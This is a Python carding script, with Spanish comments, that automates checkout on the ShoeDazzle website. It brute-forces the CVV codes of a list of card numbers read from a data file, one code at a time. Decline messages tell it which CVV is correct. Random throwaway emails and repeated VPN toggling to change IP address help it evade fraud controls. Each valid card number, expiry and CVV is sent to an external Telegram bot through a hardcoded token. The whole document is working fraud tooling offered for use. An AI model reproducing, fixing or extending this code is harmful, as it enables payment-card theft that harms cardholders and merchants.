import os
import time
import re
import random
import string
import platform
import requests
from pathlib import Path
from playwright.sync_api import sync_playwright
from colorama import Fore, Style
import subprocess

# Constantes de archivos
EMAILS_FILE = "CORREOS.txt"
USED_EMAILS_FILE = "emails_usados.txt"
DATA_FILE = "DATA.txt"
CVV_VALIDOS_FILE = "CVV_VALIDOS.txt"
CVV_INVALIDOS_FILE = "CVV_INVALIDOS.txt"

# Literales de texto repetidos
CVV_DOES_NOT_MATCH = "CVV2/CID does not match"
TRANSACTION_DECLINED = "Your transaction was declined. Please use an alternative payment method."
INPUT_NAME_SELECTOR = 'input#name'

# Configuración de Telegram
BOT_TOKEN = '7341327293:AAF5RJYD719VFFDCYuIekurEdH9p5KIPfjY'
CHAT_ID = '1125783102'


class Colores:
    ROJO = '\033[91m'
    VERDE = '\033[92m'
    AMARILLO = '\033[93m'
    AZUL = '\033[94m'
    RESET = '\033[0m'


def check_health_shoedazzlepage(url="https://www.shoedazzle.com/"):
    """Intenta acceder a la página con Playwright en modo headless hasta obtener status 200, reiniciando IP si es necesario."""
    while True:
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
                page = context.new_page()
                response = page.goto(url, timeout=60000, wait_until="load")
                status = response.status if response else None
                context.close()
                browser.close()
            if status == 200:
                print("Página accesible, status 200.")
                break
            else:
                print(f"Error al acceder a la página (status: {status}), reiniciando IP...")
                toggle_tunnelbear()
                time.sleep(3)
                toggle_tunnelbear()
                time.sleep(15)
        except Exception as e:
            print(f"Error al acceder a la página o ejecutar el script de TunnelBear: {e}")

def enviar_mensaje(mensaje):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {'chat_id': CHAT_ID, 'text': mensaje}
    response = requests.get(url, params=params)
    return response.json()

def generar_email():
    """Genera un email aleatorio con un dominio común."""
    dominios = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    nombre = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{nombre}@{random.choice(dominios)}"


def get_start_cvv(card_number, month, year):
    """Obtiene el siguiente CVV a probar para una tarjeta específica."""
    if not os.path.exists(CVV_INVALIDOS_FILE):
        return "001"
    cvv_pattern = re.compile(rf"^{re.escape(card_number)}\|{month}\|{year}\|(\d{{3}})$")
    max_cvv = 0
    with open(CVV_INVALIDOS_FILE, "r") as file:
        for line in file:
            match = cvv_pattern.match(line.strip())
            if match:
                cvv_number = int(match.group(1))
                if cvv_number > max_cvv:
                    max_cvv = cvv_number
    next_cvv = max_cvv + 1
    return str(next_cvv).zfill(3) if next_cvv <= 999 else None


def get_chrome_path():
    """Devuelve la ruta del ejecutable de Chrome según el sistema operativo."""
    system = platform.system()
    if system == "Windows":
        return "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    elif system == "Darwin":
        return "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    elif system == "Linux":
        return "/usr/bin/google-chrome"
    raise RuntimeError("Sistema operativo no compatible")


def remover_tarjeta_de_data(numero, mes, ano):
    """Elimina una tarjeta del archivo DATA.txt."""
    if not os.path.exists(DATA_FILE):
        return
    with open(DATA_FILE, "r") as f:
        lineas = f.readlines()
    with open(DATA_FILE, "w") as f:
        for linea in lineas:
            if f"{numero}|{mes}|{ano}" not in linea:
                f.write(linea)


def capturar_mensaje_alerta(page):
    """Captura el mensaje de alerta mostrado en la página."""
    try:
        page.wait_for_selector(".alert", state="visible", timeout=30000)
        page.wait_for_timeout(3000)
        for sel in [".alert-message span", ".alert-message", ".alert"]:
            try:
                texto = page.locator(sel).first.text_content()
                if texto:
                    return texto
            except Exception:
                pass
        if page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
            return CVV_DOES_NOT_MATCH
        if page.get_by_text(TRANSACTION_DECLINED).is_visible():
            return "transaction declined"
        return "Mensaje de alerta desconocido"
    except Exception:
        return "No se capturó alerta"


def preparar_checkout(page):
    """Rellena el formulario de checkout con datos predefinidos."""
    page.goto("https://www.shoedazzle.com/purchase")
    page.get_by_role("button", name="continue checkout").click()
    page.locator('[data-autotag="shipping-firstname"]').fill("hysteria")
    page.locator('[data-autotag="shipping-lastname"]').fill("on the beatt")
    page.locator('[data-autotag="shipping-address"]').fill("street 125")
    page.locator('[data-autotag="shipping-city"]').fill("new york")
    page.locator('#state').fill('new york')
    page.locator('#vs2__listbox').filter(has_text='New York').wait_for(state='visible')
    page.locator('#vs2__listbox').filter(has_text='New York').click()
    page.locator('#zip-code').fill('10023')
    page.locator('#phone-number').fill('3158272814')
    page.locator('button[data-autotag="ship-continue-btn"]').click()
    time.sleep(0.5)
    page.locator('button[data-autotag="address-verification-confirmation-btn"]').click()
    try:
        page.locator("label").filter(has_text="I accept the terms of the").locator("div").first.click()
    except Exception:
        pass


def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria", intento=1, max_intentos=6):
    """Edita y rellena el formulario de pago, devolviendo el resultado del intento."""
    try:
        if intento > max_intentos:
            return "MAX_INTENTOS"
        if page.locator('button#edit-payment-information').is_visible():
            page.locator('button#edit-payment-information').click()
            page.locator(INPUT_NAME_SELECTOR).wait_for(state="visible", timeout=5000)
        else:
            page.locator(INPUT_NAME_SELECTOR).wait_for(state="visible", timeout=5000)

        page.locator(INPUT_NAME_SELECTOR).fill(nombre_tarjeta)
        tarjeta_fmt = ' '.join([numero[i:i+4] for i in range(0, len(numero), 4)])
        page.locator('input#number').fill(tarjeta_fmt)
        page.locator('input#expiration').fill(f"{mes}/{ano}")
        time.sleep(2)
        page.locator('input#cvv').fill(cvv)

        if page.locator('button#save-payment-information').is_visible(timeout=3000):
            page.locator('button#save-payment-information').click()
        time.sleep(2)

        if page.locator('button.popup-close-button').is_visible():
            page.locator('button.popup-close-button').click()
            time.sleep(2)

        if page.locator('button[data-autotag="place-order-btn"]').is_visible(timeout=2000):
            page.locator('button[data-autotag="place-order-btn"]').click()

        mensaje = capturar_mensaje_alerta(page)
        return evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos)

    except Exception as e:
        print(f"Error en editar_y_rellenar_pago: {e}")
        return None


def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos):
    """Evalúa el resultado del intento de CVV y toma acciones según el mensaje recibido."""
    
    if CVV_DOES_NOT_MATCH in mensaje or page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
        print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
        with open(CVV_INVALIDOS_FILE, "a") as f:
            f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
        siguiente = str(int(cvv) + 1).zfill(3)
        if int(siguiente) <= 999 and intento < max_intentos:
            return siguiente
        elif intento >= max_intentos:
            print("Se alcanzó el máximo de intentos de CVV.")
            return "MAX_INTENTOS"
        else:
            print("Todos los CVVs posibles han sido probados sin éxito.")
        return None

    if "declined" in mensaje or page.get_by_text(TRANSACTION_DECLINED).is_visible():
        print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO" + Style.RESET_ALL)
        with open(CVV_VALIDOS_FILE, "a") as f:
            f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
        remover_tarjeta_de_data(numero, mes, ano)
        enviar_mensaje(f"{numero}|{mes}|{ano}|{cvv} - CVV CORRECTO ✅")
        print(Fore.YELLOW + f"[{numero}] Instancia detenida tras encontrar CVV válido" + Style.RESET_ALL)
        exit(0)

    if page.get_by_text("verify your payment information").is_visible():
        print("TARJETA BLOQUEADA: DEAD")
        return None

    if page.get_by_text("contact your bank to release the hold").is_visible():
        print(Fore.YELLOW + f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}" + Style.RESET_ALL)
        with open(CVV_VALIDOS_FILE, "a") as f:
            f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
        return None
    
    if "There was an error while processing your request" in mensaje or page.get_by_text("There was an error while processing your request").is_visible():
        print(Fore.YELLOW + f"RESET IP TUNNEL BEAR SERVICE: {cvv}" + Style.RESET_ALL)
        return "IP_INVALID"



def toggle_tunnelbear():
    """Ejecuta el script de AutoHotkey para alternar el estado de TunnelBear VPN."""
    ahk_path = r"C:\\Program Files\\AutoHotkey\\v2\\AutoHotkey64.exe"
    script_path = os.path.abspath("scripttunnelbear.ahk")
    print(f"Running AutoHotkey script: {script_path}")
    subprocess.run([ahk_path, script_path], check=True)


def lanzar_navegador_y_procesar(page, numero, mes, ano, cvv_actual, max_intentos):
    """Realiza el flujo de automatización en el navegador y prueba los CVVs."""
    intento = 1
    next_cvv = None
    while cvv_actual and intento <= max_intentos:
        resultado = editar_y_rellenar_pago(page, numero, mes, ano, cvv_actual, intento=intento, max_intentos=max_intentos)
        if resultado == "MAX_INTENTOS":
            next_cvv = str(int(cvv_actual) + 1).zfill(3) if int(cvv_actual) < 999 else None
            break
        
        if resultado == "IP_INVALID":
            next_cvv = str(int(cvv_actual)).zfill(3) if int(cvv_actual) < 999 else None
            break
        
        elif resultado and resultado.isdigit():
            cvv_actual = resultado
            intento += 1
        else:
            next_cvv = None
            break
    return next_cvv


def iniciar_checkout(page, email):
    """Realiza el flujo inicial de agregar producto y preparar checkout."""
    page.goto("https://www.shoedazzle.com/products/Brooks-Western-Boot-HS2500629-9241")
    page.get_by_role("button", name="Close").click()
    page.get_by_role("button", name="VIP Add to Bag").click()
    page.get_by_role("textbox", name="Email*").fill(email)
    page.get_by_role("textbox", name="Password (6 character minimum)*").fill("hysteria100@")
    page.get_by_role("button", name="Continue").click()
    time.sleep(2)
    for _ in range(5):
        page.locator('[data-autotag="pdp_add_to_cart"]').click()
        time.sleep(1)
    preparar_checkout(page)


def procesar_tarjeta(tarjeta_linea):
    """Procesa una tarjeta probando diferentes CVVs hasta encontrar uno válido o agotar los intentos."""
    

    numero, mes, ano = tarjeta_linea.split("|")
    chrome_path = get_chrome_path()
    start_cvv = get_start_cvv(numero, mes, ano)
    max_intentos = 6
    cvv_actual = start_cvv
    email = generar_email()
    while cvv_actual:
        
        check_health_shoedazzlepage()
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False, executable_path=chrome_path)
            context = browser.new_context()
            page = context.new_page()
            try:
                iniciar_checkout(page, email)
                next_cvv = lanzar_navegador_y_procesar(page, numero, mes, ano, cvv_actual, max_intentos)
            except Exception as e:
                print(f"[{numero}] Error: {e}")
                next_cvv = None
            finally:
                context.close()
                browser.close()
        if next_cvv:
            print("Reiniciando IP con TunnelBear...")
            try:
                toggle_tunnelbear()
                time.sleep(3)
                toggle_tunnelbear()
                time.sleep(15)
            except Exception as e:
                print(f"Error al ejecutar el script de TunnelBear: {e}")
            cvv_actual = next_cvv
            email = generar_email()
        else:
            break


def cargar_tarjetas_disponibles():
    """Carga todas las tarjetas disponibles desde DATA.txt."""
    if not os.path.exists(DATA_FILE):
        print("DATA.txt no existe")
        return []
    with open(DATA_FILE, "r") as f:
        return [line.strip() for line in f if "|" in line]


def cargar_tarjetas_validadas():
    """Carga los números de tarjetas que ya tienen un CVV válido."""
    if not os.path.exists(CVV_VALIDOS_FILE):
        return set()
    with open(CVV_VALIDOS_FILE, "r") as f:
        return set(line.strip().split("|")[0] for line in f if "|" in line)

            
def main():
    tarjetas = cargar_tarjetas_disponibles()
    if not tarjetas:
        return

    tarjetas_usadas = set()
    max_tarjetas = min(15, len(tarjetas))
    

    for i in range(max_tarjetas):
        tarjeta = tarjetas[i]
        tarjetas_usadas.add(tarjeta)
        print(f"[INFO] Procesando tarjeta {i+1}/{max_tarjetas}: {tarjeta}")
        procesar_tarjeta(tarjeta)
        tarjetas_validadas = cargar_tarjetas_validadas()
        numero = tarjeta.split("|")[0]
        if numero in tarjetas_validadas:
            print(f"[INFO] Se encontró CVV válido para {tarjeta}. Pasando a la siguiente tarjeta disponible.")
        else:
            print(f"[INFO] No se encontró CVV válido para {tarjeta}. Reintentando la misma tarjeta.")
            procesar_tarjeta(tarjeta)

    print("[INFO] Proceso secuencial finalizado. No quedan más tarjetas disponibles o todas han sido procesadas.")
    
    
if __name__ == "__main__":
    main()